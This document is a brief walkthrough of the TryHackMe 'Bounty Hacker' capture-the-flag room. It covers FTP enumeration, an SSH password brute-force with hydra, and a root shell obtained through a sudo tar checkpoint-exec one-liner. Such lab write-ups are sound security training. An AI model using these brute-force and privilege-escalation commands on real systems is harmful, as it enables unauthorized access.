# Bounty Hacker
https://tryhackme.com/room/cowboyhacker
- `nmap` shows 3 open ports
- `nmap -A -p21,22,80 <ip>` shows that anonymous log in is possible on ftp, even though most of the times the directory listing timed out. When it worked I could see there were 2 files there
- `ftp`
- `open <ip>` to  connect to the machine, `anonymous` as login and it connects
- `dir` to see what's in there
- `recv <filename>` to download
-  One of the files looks like a password list, the other one is a message signed by 'lin'
- Try to force through ssh using lin as login and going through the password list. That's done with hydra: `hydra -l lin -P locks.txt ssh://10.10.170.57`
- Password found, login with ssh as lin
- `sudo -l` to see what commands are allowed: `tar` is allowed
- quick google on how to sudo escalate through tar: 

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

... and done.
